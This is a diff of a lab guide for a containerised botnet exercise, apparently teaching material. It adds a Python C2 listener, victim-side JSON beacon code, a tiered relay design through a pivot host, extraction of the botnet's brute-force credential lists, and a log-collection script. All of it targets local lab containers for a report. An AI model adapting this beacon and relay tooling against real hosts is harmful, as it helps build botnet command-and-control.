@@ -139,53 +139,79 @@ Paste the `ip route` output to show which hosts are dual-homed (connected to mul
 
 ## 5. C2 Beacon Data
 
-Victims send HTTP beacons to the attacker on port 8888. Capture them:
+> **Note:** `botnet.py` (the autonomous botnet) does not send C2 beacons — it focuses on propagation. C2 data below requires the **manual approach from POLO.md Phase 5**.
 
+Start a listener on the attacker, then send beacons manually from the victim containers:
+
+**Terminal 1 — C2 listener on attacker:**
 ```bash
-# On the attacker container — watch incoming beacons live
-podman exec attacker bash -c "nc -l -p 8888 -k" &
-
-# Or capture with tcpdump on the attacker's interface
-podman exec attacker tcpdump -i eth0 -A port 8888 -c 20 2>/dev/null
+podman exec -it attacker python3 -c "
+import socket, json
+srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+srv.bind(('0.0.0.0', 8888)); srv.listen(10)
+print('[C2] Listener ready on port 8888')
+while True:
+    conn, addr = srv.accept()
+    data = conn.recv(1024).decode(errors='ignore')
+    print(f'[C2] BEACON from {addr[0]}: {data[:120]}')
+    conn.send(b'HTTP/1.1 200 OK\r\n\r\nOK'); conn.close()
+"
 ```
 
-The JSON beacon format is:
+**Terminal 2 — send beacons from victim1:**
+```bash
+podman exec -it victim1 python3 -c "
+import socket, time, json
+from datetime import datetime
+for i in range(5):
+    payload = json.dumps({'bot_id':'victim1','type':'HEARTBEAT','seq':i+1,
+                          'ts':datetime.utcnow().isoformat()}).encode()
+    s = socket.create_connection(('172.21.0.10', 8888), timeout=3)
+    s.send(b'POST /beacon HTTP/1.1\r\nContent-Length: ' + str(len(payload)).encode() + b'\r\n\r\n' + payload)
+    s.close(); print(f'Beacon {i+1}/5 sent'); time.sleep(5)
+"
+```
+
+The JSON beacon format you will see in the listener output:
 ```json
-{"bot_id": "victim1", "type": "HEARTBEAT", "seq": 3, "ts": 1234567890}
+{"bot_id": "victim1", "type": "HEARTBEAT", "seq": 3, "ts": "2026-05-25T10:00:00"}
 ```
 
-For deeper network bots (victim3, victim4) that cannot reach the attacker directly, beacons relay through victim1 on port 8889. Capture the relay:
-
-```bash
-podman exec victim1 tcpdump -i any port 8889 -c 10 -A 2>/dev/null
-```
-
-This demonstrates the **tiered C2 architecture** — a key concept to explain in your report.
+**victim3 cannot beacon directly to the attacker** (no route). It beacons to victim1 (10.10.0.20), which relays. This is the tiered C2 architecture — a key concept to explain in your report. Use 10.10.0.20 as the target from victim3 and set up a relay listener on victim1 port 8889 (see POLO.md Phase 5 Step 3 for the exact relay code).
 
 ---
 
-## 6. Wordlist Statistics
+## 6. Credential List Statistics
 
-The brute-force uses a wordlist. Show its size and what was in it:
+The botnet's credentials are defined as Python lists inside `botnet.py` (not a separate file). Extract them:
 
 ```bash
-# Count entries in the wordlist
-podman exec attacker wc -l /lab/wordlist.txt
-
-# Show first 20 entries
-podman exec attacker head -20 /lab/wordlist.txt
-
-# Show which credential actually worked (from botnet log)
-grep "\[OK\]" botnet_run.log | awk -F'— ' '{print $2}'
+# Show all usernames and passwords tried
+podman exec attacker python3 -c "
+import re
+src = open('/lab/botnet.py').read()
+users = re.search(r'USERNAMES\s*=\s*(\[.*?\])', src, re.S).group(1)
+pwds  = re.search(r'PASSWORDS\s*=\s*(\[.*?\])', src, re.S).group(1)
+import ast
+u = ast.literal_eval(users); p = ast.literal_eval(pwds)
+print(f'Usernames ({len(u)}): {u}')
+print(f'Passwords ({len(p)}): {p}')
+print(f'Total combinations: {len(u)*len(p)}')
+"
 ```
 
-Calculate the position of the correct credential:
+Show which credential actually worked (from botnet log):
 ```bash
-# e.g. if correct password is "toor"
-grep -n "toor" <(podman exec attacker cat /lab/wordlist.txt) | head -5
+grep "✓\|Compromised\|\[OK\]" botnet_run.log
 ```
 
-This shows how many attempts were needed before success — relevant for discussing attack efficiency.
+Find where in the list the successful password appears:
+```bash
+# Run after a botnet run — reads the compromised host's credential from the log
+grep "✓" botnet_run.log | head -5
+```
+
+This shows how many attempts were needed before the first success — the metric that shows why longer/unique passwords matter.
 
 ---
 
@@ -285,38 +311,22 @@ The pcap shows the rapid connection burst pattern characteristic of brute-force.
 
 ## 10. Quick Data Capture Script
 
-Run this after a botnet run to collect everything at once:
+`collect_data.sh` is included at the project root. Run it after any scenario:
 
 ```bash
-#!/bin/bash
-OUT="lab_data_$(date +%Y%m%d_%H%M%S)"
-mkdir -p "$OUT"
+# Collect data for scenario 2
+bash collect_data.sh 2
 
-# Botnet report JSON
-curl -s http://localhost:5000/report > "$OUT/report.json"
-
-# Auth logs from all victims
-for v in victim1 victim2 victim3 victim4 victim5; do
-  podman exec $v cat /var/log/auth.log 2>/dev/null > "$OUT/${v}_auth.log" || true
-done
-
-# Network routes (show dual-homed hosts)
-for v in victim1 victim2 victim3 victim4 victim5; do
-  podman exec $v ip route 2>/dev/null > "$OUT/${v}_routes.txt" || true
-done
-
-# Container IPs and network memberships
-podman network ls > "$OUT/networks.txt"
-for v in attacker victim1 victim2 victim3 victim4 victim5; do
-  podman inspect $v 2>/dev/null | python3 -c "
-import sys,json; d=json.load(sys.stdin)[0]
-nets = d['NetworkSettings']['Networks']
-for n,info in nets.items(): print(f'  {n}: {info[\"IPAddress\"]}')
-" | sed "1s/^/$v:\n/" >> "$OUT/networks.txt" || true
-done
-
-echo "Data saved to $OUT/"
-ls -lh "$OUT/"
+# Creates a timestamped folder: lab_data_S2_20260525_143022/
+#   gui_report.json      — full JSON from the GUI Report modal
+#   victim1_auth.log     — SSH auth log from victim1
+#   victim2_auth.log     — etc.
+#   victim3_auth.log
+#   honeypot_auth.log
+#   victimN_routes.txt   — ip route output (shows dual-homed pivot hosts)
+#   container_ips.txt    — all container IPs and network memberships
+#   credential_list.txt  — usernames/passwords tried and total combinations
+#   summary.txt          — failed/accepted counts per victim, top attacker IPs
 ```
 
-Save this as `collect_data.sh` and run it with `bash collect_data.sh` after each scenario.
+Run this after each of the 4 scenarios and you will have all the raw data needed for the comparison table in Section 8.
